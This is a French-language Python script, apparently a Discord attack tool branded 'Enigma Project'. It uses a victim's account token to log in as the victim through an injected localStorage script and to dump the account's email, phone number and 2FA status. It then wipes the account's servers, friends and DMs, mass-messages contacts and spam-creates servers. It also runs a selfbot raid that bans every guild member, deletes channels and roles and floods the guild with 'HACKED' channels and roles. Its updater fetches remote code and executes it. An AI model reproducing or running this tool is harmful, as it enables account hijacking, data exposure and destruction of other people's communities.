import threading, requests, discord, random, time, os, urllib

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
from discord.ext import commands

#U2NyaXB0IGNyZWF0ZWQgYnkgRW5pZ21hIFNhbGUgdm9sZXVyIGRpc2NvcmQuZ2cvZW5pbWFwcg==

def version():
    currentversion = 5
    print("Vérifier si vous disposez de la dernière version.")
    ver = urllib.request.urlopen("https://pastebin.com/raw/3JcRd4MC")
    for line in ver:
        version = line.decode("utf-8")
        print(f"Vous utilisez la version - V{currentversion}")
        print(f"Dernière version - V{version}")

        if version > str(currentversion):
            print("\nYou have an outdated version, downloading latest.")
            urllib.request.urlretrieve("https://raw.githubusercontent.com/iiLeafy/Discord-Account-Fucker/main/fucker.py", 'fucker.py')
            urllib.request.urlretrieve("https://raw.githubusercontent.com/iiLeafy/Discord-Account-Fucker/main/README.md", 'README.md')
            try:
                os.system("python fucker.py")
                os.system("exit")
            except Exception:
                print(f"Échec de la réouverture, veuillez rouvrir manuellement. [Mise à jour de V{version}]")
            time.sleep(9999)
        elif version == str(currentversion):
            print("Vous avez la dernière version.")
            clear()

init(convert=True)
guildsIds = []
friendsIds = []
privatechannelIds = []
clear = lambda: os.system('cls')
clear()
version()

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        for pc in self.private_channels:
            privatechannelIds.append(pc.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] token invalide", e)
            input("appuyez sur une touche pour quitter..."); exit(0)

def tokenLogin(token):
    headers = {'Authorization': token}
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')
    driver.get("https://discord.com/api/v8/users/@me/activities/statistics/applications", headers=headers)

def tokenInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.RED}ID utilisateur{Fore.RESET}]         {userID}
            [{Fore.RED}Nom utilisateur{Fore.RESET}]       {userName}
            [{Fore.RED}2 Facteur(A2F){Fore.RESET}]        {mfa}

            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Numéro de tel{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}

            ''')
            input()

#U2NyaXB0IGNyZWF0ZWQgYnkgRW5pZ21hIFNhbGUgdm9sZXVyIGRpc2NvcmQuZ2cvZW5pbWFwcg==

def tokenFuck(token):
    headers = {'Authorization': token}
    gdel = input(f'Souhaitez-vous supprimer toutes les serveurs de ce compte. y/n > ')
    fdel = input('Souhaitez-vous supprimer tous les amis de ce compte. y/n > ')
    sendall = input('Souhaitez-vous envoyer un dm à tous les dms récents sur ce compte. y/n > ')
    fremove = input('Souhaitez-vous supprimer tous les DMS récents sur ce compte. y/n > ')
    gleave = input('Souhaitez-vous quitter toutes les serveurs sur ce compte. y/n > ')
    gcreate = input('Souhaitez-vous spammer la création de serveurs sur ce compte.  y/n  > ')
    dlmode = input('Souhaitez-vous spammer le changement en mode clair et sombre. y/n > ')
    langspam = input('Souhaitez-vous spammer la langue de l utilisateur. y/n > ')
    print(f"[{Fore.RED}+{Fore.RESET}] Destruction by Enigma Project...")

    if sendall.lower() == 'y':
        try:
            sendmessage = input('Que voulez-vous envoyer à tout le monde sur les DMS récent. > ')
            for id in privatechannelIds:
                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
                print(f'Mp envoyés a {id}')
                time.sleep(1)
        except Exception as e:
            print(f'Erreur détectée, ignorer. {e}')

    if gleave.lower() == 'y':
        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
                print(f'Serveur quitté {guild}')
        except Exception as e:
            print(f'Erreur détectée, ignorer. {e}')

    if fdel.lower() == 'y':
        try:
            for friend in friendsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
                print(f'Amis supprimé {friend}')
        except Exception as e:
            print(f'Erreur détectée, ignorer. {e}')

    if fremove.lower() == 'y':
        try:
            for id in privatechannelIds:
                requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
                print(f'Message privé supprimé {id}')
        except Exception as e:
            print(f'Erreur détectée, ignorer. {e}')

    if gdel.lower() == 'y':
        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
                print(f'Serveur supprimé {guild}')
        except Exception as e:
            print(f'Erreur détectée, ignorer. {e}')

    if gcreate.lower() == 'y':
        try:
            gname = "Enigma Project HACKED"
            gserv = "100"
            for i in range(int(gserv)):
                payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
                print(f'Serveur {gname} crée. numéro: {i}')
        except Exception as e:
            print(f'Erreur détectée, ignorer. {e}')

    if dlmode.lower() == 'y':
        try:
            modes = cycle(["light", "dark"])
        except Exception as e:
            print(f'Erreur détectée, ignorer. {e}')

    if langspam.lower() == 'y':
        try:
            while True:
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
        except Exception as e:
            print(f'Erreur détectée, ignorer. {e}')

    print("\nLe token a été détruit vous pouvez fermez cette fenetre.")
    time.sleep(9999)

def selfbot_check(token):
    clear()

    print("Vérification du token, s'il est valide.")

    headers = {"Authorization": token}
    r = requests.get("https://discord.com/api/v8/users/@me/settings", headers=headers)
    if r.status_code == 401:
        print("Token transmis non valide, veuillez saisir à nouveau le token.")
        time.sleep(2)
        startMenu()
    elif r.status_code == 200:
        print("Token valide")
        selfbot(token)

def selfbot(token):
    print("\nDémarrer l'auto-bot...")

    prefix = ">"
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True, fetch_offline_members=False, intents=intents)
    bot.remove_command("help")
    bot.http.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

    @bot.event
    async def on_ready():
        print(f'\nConnecté: {bot.user.name}#{bot.user.discriminator}\nID: {bot.user.id}\nPrefixe: {prefix}\nCommande: {prefix}p [Bannir tout le monde, supprime tous les channels et rôles, crée 250 rôles et channels.]\n')

    @bot.command(pass_context=True)
    async def p(ctx):

        for m in ctx.guild.members:
            try:
                await ctx.guild.ban(m)
                print(f"{Fore.GREEN}[BAN]{Fore.RESET} Membre banni {Fore.YELLOW}{m} {Fore.RESET}ID: {Fore.YELLOW}{m.id}")
            except discord.Forbidden:
                print(f"{Fore.RED}[BAN]{Fore.RESET} Erreur dans le bannissement {Fore.YELLOW}{m} {Fore.RESET}ID: {Fore.YELLOW}{m.id}  {Fore.RESET}Raison: {Fore.YELLOW}Permission insufisante.")

        for c in ctx.guild.channels:
            try:
                await c.delete()
                print(f"{Fore.GREEN}[CHANNEL_SUPPRIME] {Fore.RESET}Channel supprimé {Fore.YELLOW}{c} {Fore.RESET}ID: {Fore.YELLOW}{c.id}")
            except discord.Forbidden:
                print(f"{Fore.RED}[CHANNEL_SUPPRIME] {Fore.RESET} Erreur dans la suppression du channel {Fore.YELLOW}{c} {Fore.RESET}ID: {Fore.YELLOW}{c.id} {Fore.RESET}Raison:{Fore.YELLOW} Permission insufisante.")

        for r in ctx.guild.roles:
            try:
                await r.delete()
                print(f"{Fore.GREEN}[ROLE_SUPPRIME] {Fore.RESET}Role supprimé {Fore.YELLOW}{r} {Fore.RESET}ID: {Fore.YELLOW}{r.id}")
            except discord.Forbidden:
                print(f"{Fore.RED}[ROLE_SUPPRIME] {Fore.RESET} Erreur dans la suppression du role {Fore.YELLOW}{r} {Fore.RESET}ID: {Fore.YELLOW}{r.id} {Fore.RESET}Reason:{Fore.YELLOW} Permission insufisante.")
            except Exception:
                print(f"{Fore.RED}[ROLE_SUPPRIME] {Fore.RESET} Erreur dans la suppression du role, raison inconnue.")

        for x in range(0, 250):
            try:
                await ctx.guild.create_role(name="ENIGMA FUCKED HACKED!", colour=discord.Colour(0xd300ff))
                print(f"{Fore.GREEN}[ROLE_CREATION] {Fore.RESET}Role crée, numéro: {x}")
            except Exception:
                print(f"{Fore.RED}[ROLE_CREATION] {Fore.RESET}Erreur dans la création du role.")

        for x in range(0, 250):
            try:
                await ctx.guild.create_text_channel('ENIGMA VOUS DOMINE!')
                print(f"{Fore.GREEN}[CHANNEL_CREATION] {Fore.RESET}Canal de texte créé, numéro: {x}")
                await ctx.guild.create_voice_channel('ENIGMA HACKED!')
                print(f"{Fore.GREEN}[CHANNEL_CREATION] {Fore.RESET}Canal vocal créé, numéro: {x}")
                await ctx.guild.create_category_channel('ENIGMA ON DISCORD!')
                print(f"{Fore.GREEN}[CHANNEL_CREATION] {Fore.RESET}Chaîne de catégorie créée, numéro: {x}")
            except Exception:
                print(f"{Fore.RED}[CHANNEL_CREATION] {Fore.RESET}Échec de la création des channels")

    bot.run(token, bot=False)

#U2NyaXB0IGNyZWF0ZWQgYnkgRW5pZ21hIFNhbGUgdm9sZXVyIGRpc2NvcmQuZ2cvZW5pbWFwcg==

def getBanner():
    banner = f'''
                       {Fore.RED}███████╗███╗   ██╗██╗ ██████╗ ███╗   ███╗ █████╗
                       ██╔════╝████╗  ██║██║██╔════╝ ████╗ ████║██╔══██╗
                       █████╗  ██╔██╗ ██║██║██║  ███╗██╔████╔██║███████║
                       ██╔══╝  ██║╚██╗██║██║██║   ██║██║╚██╔╝██║██╔══██║
                       ███████╗██║ ╚████║██║╚██████╔╝██║ ╚═╝ ██║██║  ██║
                       ╚══════╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝{Fore.RESET}


                [{Fore.RED}1{Fore.RESET}] Token fuck le compte
                [{Fore.RED}2{Fore.RESET}] Récupérer des informations sur le compte (via token)
                [{Fore.RED}3{Fore.RESET}] Connectez-vous à un token            {Fore.GREEN}[Besoin : chromedriver.exe]{Fore.RESET}
                [{Fore.RED}4{Fore.RESET}] Auto-bot pour raid des serv.         {Fore.GREEN}[NOUVELLE FONCTIONNALITÉ!]{Fore.RESET}                 

                {Fore.GREEN} Enigma Project: {Fore.CYAN} Vous pouvez rejoindre notre discord : https://discord.gg/84WGkHFWCE
                                  Vous pouvez allez voir notre chaine : https://www.youtube.com/channel/UCkPcqrNu0AQs1NZJ2dbeF3w{Fore.RESET}
    '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
    return banner

def startMenu():
    clear()
    print(getBanner())
    print(f'[{Fore.RED}>{Fore.RESET}] Votre choix', end=''); choice = str(input('  :  '))

    if choice == '1':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        print(f'[{Fore.RED}>{Fore.RESET}] Threads amount (number)', end=''); threads = input('  :  ')
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokenFuck, args=(token, ))
            t.start()

    elif choice == '2':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        tokenInfo(token)
    
    elif choice == '3':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        tokenLogin(token)

    elif choice == '4':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        selfbot_check(token)

    elif choice.isdigit() == False:
        clear()
        startMenu()

    else:
        clear()
        startMenu()
        
if __name__ == '__main__':
    startMenu()

#U2NyaXB0IGNyZWF0ZWQgYnkgRW5pZ21hIFNhbGUgdm9sZXVyIGRpc2NvcmQuZ2cvZW5pbWFwcg==